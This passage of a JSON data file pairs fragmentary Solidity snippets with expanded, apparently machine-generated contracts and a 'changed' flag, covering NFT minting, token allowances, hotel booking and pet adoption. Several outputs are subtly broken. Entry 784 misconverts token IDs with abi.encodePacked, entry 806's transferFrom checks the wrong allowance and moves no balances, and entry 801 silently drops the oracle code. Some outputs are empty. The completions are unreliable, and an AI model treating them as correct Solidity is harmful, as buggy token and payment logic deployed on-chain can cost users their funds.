        "input": "contract MyContract {\n    mapping (string => address) tokenUsers;\n\n    function addWhitelist(\n        address _t,\n        bytes32 _something,\n        string memory _id\n    ) public {\n        tokenUsers[_id] = msg.sender;\n        ITargetContract(_t).addCandidateIdToWhitelist(_something, _id);\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4) {\n        ITargetContract.safeTransferFrom(\n            address(this),\n            tokenUsers[_tokenId],\n            _stringToUint(_tokenId)\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ITargetContract {\n    function addCandidateIdToWhitelist(bytes32 _something, string calldata _id) external;\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n}\n\ncontract MyContract {\n    mapping (string => address) tokenUsers;\n\n    function addWhitelist(\n        address _t,\n        bytes32 _something,\n        string memory _id\n    ) public {\n        tokenUsers[_id] = msg.sender;\n        ITargetContract(_t).addCandidateIdToWhitelist(_something, _id);\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) external returns(bytes4) {\n        ITargetContract(_operator).safeTransferFrom(\n            address(this),\n            tokenUsers[uint256ToString(_tokenId)],\n            _tokenId\n        );\n        return this.onERC721Received.selector;\n    }\n\n    function uint256ToString(uint256 _tokenId) private pure returns(string memory) {\n        return string(abi.encodePacked(_tokenId));\n    }\n}\n",
        "changed": 0
    },
    "785.sol": {
        "input": "    function crossmint(address to, uint8 amount) external payable {\n        uint256 total = oefbContract.totalSupply();\n        oefbContract.mintNFT{value: msg.value}(amount);\n\n        for (uint256 i = 0; i < amount; i++) {\n            oefbContract.transferFrom(address(this), to, total + i);\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IOefbContract {\n    function totalSupply() external view returns (uint256);\n    function mintNFT(uint8 amount) external payable;\n    function transferFrom(address from, address to, uint256 tokenId) external;\n}\n\ncontract CrossMint {\n    IOefbContract private oefbContract;\n\n    constructor(address _oefbContract) {\n        oefbContract = IOefbContract(_oefbContract);\n    }\n\n    function crossmint(address to, uint8 amount) external payable {\n        uint256 total = oefbContract.totalSupply();\n        oefbContract.mintNFT(amount);\n\n        for (uint256 i = 0; i < amount; i++) {\n            oefbContract.transferFrom(address(this), to, total + i);\n        }\n    }\n}\n\n",
        "changed": 1
    },
    "786.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Hello {\n    constructor(string memory text1, string memory text2) {}\n}\n\ncontract World {\n    function foo() external {\n        new Hello(\"constructor\", \"params\");\n\n        Hello(address(0x123));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Hello {\n    constructor(string memory text1, string memory text2) {}\n}\n\ncontract World {\n    function foo() external {\n        // deploying new contract\n        new Hello(\"constructor\", \"params\");\n\n        // pointing to an already deployed contract\n        Hello(address(0x123));\n    }\n}\n\n",
        "changed": 0
    },
    "787.sol": {
        "input": "         function bookroom1() public payable uptofee{                  \n            require(booked.isOccupied == false, \"This room is alraeady occupied\");              \n            payable(owner).transfer(msg.value); \n            hotelroomsarray[0].isOccupied = true;                          \n            bookertoroom[msg.sender] = hotelroomsarray[0];\n            bookers.push(msg.sender);       \n            addrtoamntpaid[msg.sender] = msg.value; \n            count++;                \n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HotelBooking {\n    address public owner;\n    uint public fee;\n    uint public count;\n\n    struct Room {\n        bool isOccupied;\n    }\n\n    Room[] public hotelroomsarray;\n    \n    mapping(address => Room) public bookertoroom;\n    mapping(address => uint) public addrtoamntpaid;\n    address[] public bookers;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only the contract owner can call this function\");\n        _;\n    }\n\n    modifier uptofee {\n        require(msg.value <= fee, \"Amount should be less than or equal to fee\");\n        _;\n    }\n\n    constructor(uint _roomCount, uint _fee) {\n        owner = msg.sender;\n        fee = _fee;\n        \n        for(uint i = 0; i < _roomCount; i++) {\n            hotelroomsarray.push(Room({\n                isOccupied: false\n            }));\n        }\n    }\n\n    function bookroom1() public payable uptofee {                  \n        require(hotelroomsarray[0].isOccupied == false, \"This room is already occupied\");              \n        payable(owner).transfer(msg.value); \n        hotelroomsarray[0].isOccupied = true;                          \n        bookertoroom[msg.sender] = hotelroomsarray[0];\n        bookers.push(msg.sender);       \n        addrtoamntpaid[msg.sender] = msg.value; \n        count++;                \n    }\n\n    function getBookers() public view returns (address[] memory) {\n        return bookers;\n    }\n\n    function getRoomStatus(uint index) public view returns (bool) {\n        return hotelroomsarray[index].isOccupied;\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "788.sol": {
        "input": "function tokenFallback(address _from, uint _value, bytes _data) {\n}\n\nfunction tokenFallback(address _from, uint _value, bytes _data) {\n    _from;\n    _value;\n    _data;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Receiver {\n    event TokenReceived(address indexed _from, uint _value, bytes _data);\n\n    function tokenFallback(address _from, uint _value, bytes memory _data) public {\n        // When a token is received, emit an event.\n        emit TokenReceived(_from, _value, _data);\n    }\n}\n\n",
        "changed": 0
    },
    "789.sol": {
        "input": "App = {\n  web3Provider: null,\n  accounts: [],\n  contracts: {},\n\n  init: async function() {\n    $.getJSON('../pets.json', function(data) {\n      var petsRow = $('#petsRow');\n      var petTemplate = $('#petTemplate');\n\n      for (i = 0; i < data.length; i ++) {\n        petTemplate.find('.panel-title').text(data[i].name);\n        petTemplate.find('img').attr('src', data[i].picture);\n        petTemplate.find('.pet-breed').text(data[i].breed);\n        petTemplate.find('.pet-age').text(data[i].age);\n        petTemplate.find('.pet-location').text(data[i].location);\n        petTemplate.find('.btn-adopt').attr('data-id', data[i].id);\n        petTemplate.find('.btn-return').attr('data-id', data[i].id);\n\n        petsRow.append(petTemplate.html());\n      }\n    });\n\n    return await App.initWeb3();\n  },\n\n  initWeb3: async function() {\n\n    if (window.ethereum){\n      try {\n        App.accounts = await window.ethereum.request({ method: \"eth_requestAccounts\" });\n      } catch (error) {\n        console.error(\"User denied account access\");\n      }\n      \n      console.log(\"Account[0]: \"+App.accounts[0]);\n      \n      App.web3Provider = window.ethereum;\n      console.log(\"modern dapp browser\");\n    }\n    else if (window.web3) {\n      App.web3Provider = window.web3.currentProvider;\n      App.accounts = window.eth.accounts;\n      console.log(\"legacy dapp browser\");\n    }\n    else {\n      App.web3Provider = new Web3.providers.HttpProvider('http:\n    }\n    \n\n    return App.initContract();\n    \n  },\n\n  initContract: function() {\n\n    $.getJSON('Adoption.json', function(data) {\n      var AdoptionArtifact = data;\n      try { App.contracts.Adoption = TruffleContract(AdoptionArtifact); } catch (error) { console.error(error); }\n\n      try {\n        App.contracts.Adoption.setProvider(App.web3Provider);\n      } catch (error){\n        console.log(error);\n      }\n      return App.markAdopted();\n    });\n\n    return App.bindEvents();\n  },\n\n  bindEvents: function() {\n    $(document).on('click', '.btn-adopt', App.handleAdopt);\n    $(document).on('click', '.btn-return', App.handleReturn);\n  },\n\n  markAdopted: function() {\n\n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.getAdopters.call();\n    }).then(function(adopters) {\n        \n        for(i=0;i<adopters.length;i++){\n            if (adopters[i] != '0x0000000000000000000000000000000000000000') {\n                if (adopters[i] == App.accounts[0]){\n                    $('.panel-pet').eq(i).find('.btn-return').text('Return').attr('disabled', false);\n                    $('.panel-pet').eq(i).find('.btn-adopt').text('Adopted').attr('disabled', true);\n                } else {\n                    $('.panel-pet').eq(i).find('.btn-return').text('-').attr('disabled', true);\n                    $('.panel-pet').eq(i).find('.btn-adopt').text('Adopted').attr('disabled', true);\n                }\n            } else {\n                $('.panel-pet').eq(i).find('.btn-return').text('-').attr('disabled', true);\n            }\n        }\n\n        \n    }).catch(function(err) {\n      console.log(err.message);\n    });\n  },\n\n  handleReturn: function(event) {\n    event.preventDefault();\n    \n    var petId = parseInt($(event.target).data('id'));\n    \n    console.log(\"handleReturn petId: \"+petId+\" Account[0]: \"+App.accounts[0]);\n    console.log(\"petID:\"+petId);\n    console.log(\"Account[0]: \"+App.accounts[0]);\n    \n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.returnPet(petId, {from: App.accounts[0]});\n    }).then(function(result){\n        App.markAdopted();\n    });\n    \n  },\n\n\n  handleAdopt: function(event) {\n    event.preventDefault();\n\n    var petId = parseInt($(event.target).data('id'));\n    console.log(\"handleAdopt petId: \"+petId+\" Account[0]: \"+App.accounts[0]);\n    console.log(\"petId:\"+petId);\n\n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.adopt(petId, {from: App.accounts[0]});\n    }).then(function(result){\n        App.markAdopted();\n    });\n    \n  }\n\n};\n\n$(function() {\n  $(window).load(function() {\n    App.init();\n  });\n});\n\npragma solidity ^0.5.0;\n\ncontract Adoption {\n    address[16] public adopters;\n\n    function adopt(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n\n        adopters[petId] = msg.sender;\n\n        return petId;\n    }\n\n    function getAdopters() public view returns (address[16] memory) {\n        return adopters;\n    }\n    \n    function returnPet(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n        \n        require(msg.sender == adopters[petId]);\n        \n        adopters[petId] = address(0);\n        \n        return petId;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Adoption {\n    address[16] public adopters;\n\n    function adopt(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15, \"Invalid petId. It should be between 0 and 15.\");\n\n        adopters[petId] = msg.sender;\n\n        return petId;\n    }\n\n    function getAdopters() public view returns (address[16] memory) {\n        return adopters;\n    }\n    \n    function returnPet(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15, \"Invalid petId. It should be between 0 and 15.\");\n        require(msg.sender == adopters[petId], \"Only the adopter can return the pet.\");\n\n        adopters[petId] = address(0); // Reset the adopter\n        \n        return petId;\n    }\n}\n\n",
        "changed": 0
    },
    "790.sol": {
        "input": "function returnStuff() public returns (uint256, uint256) {\n   return (1, 3);\n}\n\n( , uint256 ourNum) = returnStuff();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StuffReturner {\n    uint256 public ourNum;\n\n    function returnStuff() public returns (uint256, uint256) {\n        return (1, 3);\n    }\n\n    function getStuff() public {\n        ( , ourNum) = returnStuff();\n    }\n}\n\n",
        "changed": 0
    },
    "791.sol": {
        "input": "    Counters.Counter public _votingId;\n\n    _votingId.increment();\n    uint256 idNumber=_votingId.current();\n\n\n",
        "output": "",
        "changed": 0
    },
    "792.sol": {
        "input": "constructor() {\n    creator=msg.sendor;\n    deposits=0;\n}\n\npragma solidity ^0.8.0;\n\ncontract PiggyBank {\n    address creator;\n    uint deposits;\n\n    constructor() {\n        creator=msg.sender;\n        deposits=0;\n    }\n\n    function deposit() public payable returns(uint) {\n        if(msg.value>0) {\n            deposits=deposits+1;\n        }\n        return getNumberofDeposits();  \n    }\n\n    function getNumberofDeposits() public view returns(uint) {\n        return deposits;\n    }\n    \n    function Killl() public {\n        if(msg.sender==creator) {\n            selfdestruct(payable(creator));\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PiggyBank {\n    address public creator;\n    uint public deposits;\n\n    constructor() {\n        creator = msg.sender;\n        deposits = 0;\n    }\n\n    function deposit() public payable returns(uint) {\n        require(msg.value > 0, \"Deposit amount should be greater than zero\");\n        deposits += 1;\n        return getNumberofDeposits();  \n    }\n\n    function getNumberofDeposits() public view returns(uint) {\n        return deposits;\n    }\n    \n    function kill() public {\n        require(msg.sender == creator, \"Only the creator can destroy the contract\");\n        selfdestruct(payable(creator));\n    }\n}\n",
        "changed": 0
    },
    "793.sol": {
        "input": "contract Temp{\n\n    MainContract main;\n\n    constructor(MainContract _main) {\n        main = _main;\n    }\n    \n\n    function getData(uint number) public view returns(string memory){\n        return main.get(number);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MainContract {\n    function get(uint _number) public view returns(string memory){\n        //...body of this function\n    }\n}\n\n",
        "changed": 0
    },
    "794.sol": {
        "input": "enum Animal {CAT, DOG}\nmapping(Animal => int8) maps;\n\nconstructor() {\n        maps[Animal.CAT] = 10;\n}\n\nfunction decrementAnimal(Animal _animal) public {\n        maps[_animal] -= 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AnimalContract {\n    enum Animal {CAT, DOG}\n    mapping(Animal => int8) public maps;\n\n    constructor() public {\n        maps[Animal.CAT] = 10;\n    }\n\n    function decrementAnimal(Animal _animal) public {\n        maps[_animal] -= 1;\n    }\n}\n\n",
        "changed": 0
    },
    "795.sol": {
        "input": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract receiverContract {\n\n    event Log(uint);\n    address public recipient;\n\n    constructor () {\n        recipient = address(this);\n    } \n\n    fallback () external payable {\n        emit Log(gasleft());\n    } \n\n    receive () external payable {}\n\n    function getThisAddress() public view returns(address) {\n        return address(this);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n\n}\n\n\n\ncontract senderContract is receiverContract {\n\n    address _recipient=super.getThisAddress();\n\n\n    function manualTransfer (address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function autoTransfer () public payable {\n        payable(_recipient).transfer(msg.value);\n    }\n\n}\n\n\n",
        "output": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract receiverContract {\n\n    event Log(uint);\n    address public recipient;\n\n    constructor () {\n        recipient = address(this);\n    } \n\n    fallback () external payable {\n        emit Log(gasleft());\n    } \n\n    receive () external payable {}\n\n    function getThisAddress() public view returns(address) {\n        return address(this);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n\n}\n\n\n\ncontract senderContract is receiverContract {\n\n    address _recipient=super.getThisAddress();\n\n// please see https://docs.soliditylang.org/en/v0.8.14/contracts.html?highlight=super \n//to understand how \"super\" works\n\n    function manualTransfer (address payable _to) public payable {\n        _to.transfer(msg.value);\n    }\n\n    function autoTransfer () public payable {\n        payable(_recipient).transfer(msg.value);\n    }\n\n}\n\n",
        "changed": 0
    },
    "796.sol": {
        "input": "mapping(uint256 => Placeholder) public placeholder;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Placeholder {\n        uint256 id;\n        string name;\n    }\n\n    mapping(uint256 => Placeholder) public placeholders;\n\n    uint256 public placeholdersCount;\n\n    function addPlaceholder(string memory _name) public {\n        placeholdersCount ++;\n        placeholders[placeholdersCount] = Placeholder(placeholdersCount, _name);\n    }\n\n    function getPlaceholder(uint256 _id) public view returns (uint256, string memory) {\n        Placeholder memory placeholder = placeholders[_id];\n        return (placeholder.id, placeholder.name);\n    }\n}\n\n",
        "changed": 0
    },
    "797.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\npragma experimental ABIEncoderV2;\n\ncontract ToDoList {\n    ...\n   mapping(address => Task[]) public tasks;\n\n    event AddTask(address indexed creator, uint256 indexed id, string description);\n\n    function addTask(string memory _description) public {\n        uint256 id = uint256(\n            keccak256(abi.encodePacked(msg.sender, _description))\n        );\n\n        tasks[msg.sender].push(\n            Task({id: id, description: _description, completed: false})\n        );\n\n        emit AddTask(msg.sender,id,_description);\n    }\n\n...\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ToDoList {\n    struct Task {\n        uint256 id;\n        string description;\n        bool completed;\n    }\n\n    mapping(address => Task[]) public tasks;\n\n    event AddTask(address indexed creator, uint256 indexed id, string description);\n\n    function addTask(string memory _description) public {\n        uint256 id = uint256(\n            keccak256(abi.encodePacked(msg.sender, _description))\n        );\n\n        tasks[msg.sender].push(\n            Task({id: id, description: _description, completed: false})\n        );\n\n        emit AddTask(msg.sender,id,_description);\n    }\n\n    function getTasks(address _address) public view returns(Task[] memory) {\n        return tasks[_address];\n    }\n\n    function completeTask(uint256 _id) public {\n        Task[] storage userTasks = tasks[msg.sender];\n        for(uint i = 0; i < userTasks.length; i++) {\n            if(userTasks[i].id == _id) {\n                userTasks[i].completed = true;\n                break;\n            }\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "798.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport \"./SUSHI.sol\";\n\ncontract BNB is ERC20, Ownable, AccessControl{\n\n    string tokenName = \"BNB token\";\n    string tokenSymbol = \"BNB\";\n    uint decimal = 2;\n    uint initFund = ...;\n    uint rate = 32;\n\n    constructor() ERC20 (tokenName, tokenSymbol){\n        _mint(msg.sender, initFund);\n    }\n\n    function setRate(uint _rate) public onlyOwner {\n        rate = _rate;\n    }\n    function getRate() public view returns(uint) {\n        return rate;\n    }\n\n    function buyBNB(uint _amount){\n        address owner = owner();\n        require(_amount * rate == msg.value)\n        transfer(msg.sender, _amount)\n    }\n    function exchange(uint _amount){\n        SUSHI sushi = SUSHI(address(this));\n        uint sushiRate = sushi.getRate();\n        require(sushi.balanceOf(msg.sender) >= _amount * sushiRate / rate)\n        transfer(msg.sender, _amount);\n    }\n    \n    receive() payable {}\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "799.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    receive() external payable {\n        // executed when the `data` field is empty and `value` is > 0\n    }\n}\n\n",
        "changed": 0
    },
    "800.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract NFT is ERC721Enumerable, Ownable {\n  using Strings for uint256;\n\n  string public baseURI;\n  string public baseExtension = \".json\";\n  uint256 public cost = 0.05 ether;\n  uint256 public maxSupply = 300;\n  uint256 public maxMintAmount = 10;\n  bool public paused = false;\n  mapping(address => bool) public whitelisted;\n\n  constructor(\n    string memory _name,\n    string memory _symbol,\n    string memory _initBaseURI\n  ) ERC721(_name, _symbol) {\n    setBaseURI(_initBaseURI);\n    mint(msg.sender, 20);\n  }\n  \n  function _baseURI() internal view virtual override returns (string memory) {\n    return baseURI;\n  }\n\n  function mint(address _to, uint256 _mintAmount) public payable {\n    uint256 supply = totalSupply();\n    require(!paused, \"msg1\");\n    require(_mintAmount > 0, \"msg2\");\n    require(_mintAmount <= maxMintAmount, \"msg3\");\n    require(supply + _mintAmount <= maxSupply, \"msg4\");\n\n    if (msg.sender != owner()) {\n        if(whitelisted[msg.sender] != true) {\n          require(msg.value >= cost * _mintAmount, \"msg5\");\n        }\n    }\n\n    for (uint256 i = 1; i <= _mintAmount; i++) {\n      _safeMint(_to, supply + i);\n    }\n  }\n\n  function walletOfOwner(address _owner)\n    public\n    view\n    returns (uint256[] memory)\n  {\n    uint256 ownerTokenCount = balanceOf(_owner);\n    uint256[] memory tokenIds = new uint256[](ownerTokenCount);\n    for (uint256 i; i < ownerTokenCount; i++) {\n      tokenIds[i] = tokenOfOwnerByIndex(_owner, i);\n    }\n    return tokenIds;\n  }\n\n  function tokenURI(uint256 tokenId)\n    public\n    view\n    virtual\n    override\n    returns (string memory)\n  {\n    require(\n      _exists(tokenId),\n      \"ERC721Metadata: URI query for nonexistent token\"\n    );\n\n    string memory currentBaseURI = _baseURI();\n    return bytes(currentBaseURI).length > 0\n        ? string(abi.encodePacked(currentBaseURI, tokenId.toString(), baseExtension))\n        : \"\";\n  }\n\n  function setCost(uint256 _newCost) public onlyOwner {\n    cost = _newCost;\n  }\n\n  function setmaxMintAmount(uint256 _newmaxMintAmount) public onlyOwner {\n    maxMintAmount = _newmaxMintAmount;\n  }\n\n  function setBaseURI(string memory _newBaseURI) public onlyOwner {\n    baseURI = _newBaseURI;\n  }\n\n  function setBaseExtension(string memory _newBaseExtension) public onlyOwner {\n    baseExtension = _newBaseExtension;\n  }\n\n  function pause(bool _state) public onlyOwner {\n    paused = _state;\n  }\n \n function whitelistUser(address _user) public onlyOwner {\n    whitelisted[_user] = true;\n  }\n \n  function removeWhitelistUser(address _user) public onlyOwner {\n    whitelisted[_user] = false;\n  }\n\n  function withdraw() public payable onlyOwner {\n    (bool hs, ) = payable(0x985C134D876439d92De8DD3c6e7d66dd420D481a).call{value: address(this).balance * 5 / 100}(\"\");\n    require(hs, \"msg6\");\n\n    (bool os, ) = payable(owner()).call{value: address(this).balance}(\"\");\n    require(os, \"msg7\");\n  }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "801.sol": {
        "input": "contract Chainlink is usingOraclize {\n    string public EURUSD;\n    function updatePrice() public payable {\n        if (oraclizegetPrice(\"URL\") > this.balance) { \n        } else {\n            oraclizequery(\"URL\", \"json(http:\n        }\n    }\n    function _callback(bytes32 myid, string result) public {\n        require(msg.sender == oraclizecbAddress());\n        EURUSD = result;\n    }\n}\n\n  contract DummyContract {\n    event LogSent(bytes32 data);\n    function sendData(address otherContractAddress, bytes32 data) public {\n        if (someCondition) {\n            someFunction();\n        }\n\n    emit LogSent(data);\n    otherContractAddress.call(data);\n\n    Oracle.sendData(data);\n}\n\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DummyContract {\n    event LogSent(bytes32 data);\n\n    function sendData(address otherContractAddress, bytes32 data) public {\n        require(otherContractAddress != address(0), \"Invalid address\");\n        (bool success,) = otherContractAddress.call(abi.encodePacked(data));\n        require(success, \"Call failed\");\n        emit LogSent(data);\n    }\n}\n\n",
        "changed": 1
    },
    "802.sol": {
        "input": "import \"hardhat/console.sol\";\n\nconsole.log(variable); \nconsole.log(1234); \n\n\n",
        "output": "",
        "changed": 0
    },
    "803.sol": {
        "input": "constructor() public {\n  _name = {{TOKEN_NAME}};\n  _symbol = {{TOKEN_SYMBOL}};\n  _decimals = {{DECIMALS}};\n  _totalSupply = {{TOTAL_SUPPLY}};\n  _balances[msg.sender] = _totalSupply;\n\n  emit Transfer(address(0), msg.sender, _totalSupply);\n}\n\nconstructor() public {\n  _name = \"MyToken\";\n  _symbol = \"MyT\";\n  _decimals = 18;\n  _totalSupply = 1000000000000000000;\n  _balances[msg.sender] = _totalSupply;\n\n  emit Transfer(address(0), msg.sender, _totalSupply);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    string public _name;\n    string public _symbol;\n    uint8 public _decimals;\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) public _balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        _name = \"MyToken\";\n        _symbol = \"MyT\";\n        _decimals = 18;\n        _totalSupply = 1000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return _balances[_owner];\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(_balances[msg.sender] >= _value, \"Insufficient balance.\");\n        _balances[msg.sender] -= _value;\n        _balances[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "804.sol": {
        "input": "\ncontract minter{\n\n  mapping(address => bool) public whiteList;\n\n  function whiteLister( address _user) public{\n    whiteList[_user] = true;   \n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Minter {\n    address public minter;\n    mapping (address => bool) public whiteList;\n\n    constructor() public {\n        minter = msg.sender;\n    }\n\n    modifier onlyMinter {\n        require(\n            msg.sender == minter,\n            \"Only minter can call this function.\"\n        );\n        _;\n    }\n\n    function addToWhitelist(address _user) public onlyMinter {\n        whiteList[_user] = true;\n    }\n\n    function isWhitelisted(address _user) public view returns (bool) {\n        return whiteList[_user];\n    }\n}\n\n",
        "changed": 0
    },
    "805.sol": {
        "input": " uint public highestPrice=0 \n mapping(uint->string) public highestSoldNft\n\nfunction mint(string memory tokenUri, uint price) public payable returns(uint){ \n    _safeMint(msg.sender,newTokenId);\n    if (price > highestPrice){\n        delete highestSoldNft[highestPrice]\n        setHighestPrice(price)\n        setHighestSoldNft(tokenUri,price)\n    }}\n\n    function setHighestPrice(uint price) public private {\n        highestPrice=price\n    }\n    \n    function setHghestSoldNft(string memory tokenUri,uint price) public private{\n        highestSoldNft[price]=tokenUri\n    }\n\n\n",
        "output": "",
        "changed": 0
    },
    "806.sol": {
        "input": "allowance[B][C] = 10;\n\nallowance[B][C] =  allowance[B][C] - 6; (10-6 --> C still can send 4 tokens from now on)\n\nallowance[deployer][exchange] =  allowance[deployer][exchange] - _value;\n\nallowance[deployer][exhange] = _value;\n\ntoken.transferFrom(deployer, receiver, amount).send( { from: exchange } )\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenContract {\n\n  address deployer;\n  mapping (address => mapping (address => uint256)) public allowance;\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n  \n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n    require(_value <= allowance[_from][_to]);\n    allowance[_from][_to] -= _value;\n    emit Transfer(_from, _to, _value);\n    return true;\n  }\n\n  constructor() public {\n    deployer = msg.sender;\n  }\n\n  function setAllowance(address _spender, uint256 _value) public {\n    // Only deployer can set allowance\n    require(msg.sender == deployer);\n    allowance[deployer][_spender] = _value;\n  }\n\n  function executeTransfer(address _from, address _to, uint256 _value) public {\n    // Only allowed address can execute transfer\n    require(allowance[_from][msg.sender] > 0);\n    transferFrom(_from, _to, _value);\n  }\n\n  function testAllowance() public {\n    address B = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;\n    address C = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;\n    address exchange = 0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB;\n    address receiver = 0x583031D1113aD414F02576BD6afaBfb302140225;\n    uint256 amount = 4;\n\n    allowance[B][C] = 10;\n    allowance[B][C] -= 6; // 10 - 6 --> C still can send 4 tokens from now on\n    allowance[deployer][exchange] -= amount;\n    allowance[deployer][exchange] = amount;\n\n    executeTransfer(deployer, receiver, amount);\n  }\n}\n\n",
        "changed": 1
    },
    "807.sol": {
        "input": "constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n\nconst Inbox = artifacts.require(\"Inbox\");\n\nmodule.exports = function (deployer) {\n  deployer.deploy(Inbox, \"myInitialMessage\");\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Inbox {\n    string public message;\n\n    constructor(string memory initialMessage) public {\n        message = initialMessage;\n    }\n\n    function setMessage(string memory newMessage) public {\n        message = newMessage;\n    }\n\n    function getMessage() public view returns (string memory) {\n        return message;\n    }\n}\n\n",
        "changed": 0
    },
    "808.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address owner = address(0x123);\n\n    function foo() external payable {\n        require(msg.value == 1e18);\n\n        payable(owner).transfer(msg.value);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address owner = address(0x123);\n\n    // `payable` modifier allows the function to accept ETH\n    function foo() external payable {\n        // validate that the received amount is 1e18 wei (1 ETH)\n        require(msg.value == 1e18);\n\n        // typecast `address` variable (name `owner`)\n        // to `address payable` and effectively redirect the received value\n        // with the native `transfer()` function of the `address payable` type\n        payable(owner).transfer(msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "809.sol": {
        "input": "pragma solidity ^0.8.0;\nimport \"@0xcyphered/secp256k1-solidity/contracts/SECP256K1.sol\";\ncontract Example {\n    function recoverPersonalSignPublicKey(\n        bytes32 message,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public pure returns (bytes memory) {\n        string memory header = '\\x19Ethereum Signed Message:\\n32';\n        bytes32 _message = keccak256(abi.encodePacked(header, message));\n        (uint256 x, uint256 y) = SECP256K1.recover(uint256(_message), v - 27, uint256(r), uint256(s));\n        return abi.encodePacked(x, y);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "810.sol": {
        "input": "pragma solidity ^0.8.0;\n\ninterface ICounter {\n    function increment() external;\n}\n\ncontract MyContract {\n    ICounter counter;\n\n    constructor(address _counter) {\n        counter = ICounter(_counter);\n    }\n\n    function incrementCount() external {\n        counter.increment();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.0;\n\ninterface ICounter {\n    function increment() external;\n}\n\ncontract MyContract {\n    ICounter counter;\n\n    constructor(address _counter) {\n        counter = ICounter(_counter);\n    }\n\n    function incrementCount() external {\n        counter.increment();\n    }\n}\n\n",
        "changed": 0
    },
    "811.sol": {
        "input": "    function getPayout(address payable addressOfProposer)\n        public\n        returns (bool)\n    {\n        uint256 allowanceAvailable = _payoutTotals[addressOfProposer];\n        require(allowanceAvailable > 0, \"You do not have any funds available.\");\n\n        _decreasePayout(addressOfProposer, allowanceAvailable);\n\n        (bool sent, ) = addressOfProposer.call{value: allowanceAvailable}(\"\");\n        require(sent, \"Failed to send ether\");\n\n        emit Withdraw(addressOfProposer, allowanceAvailable);\n        return true;\n    }\n\n\n",
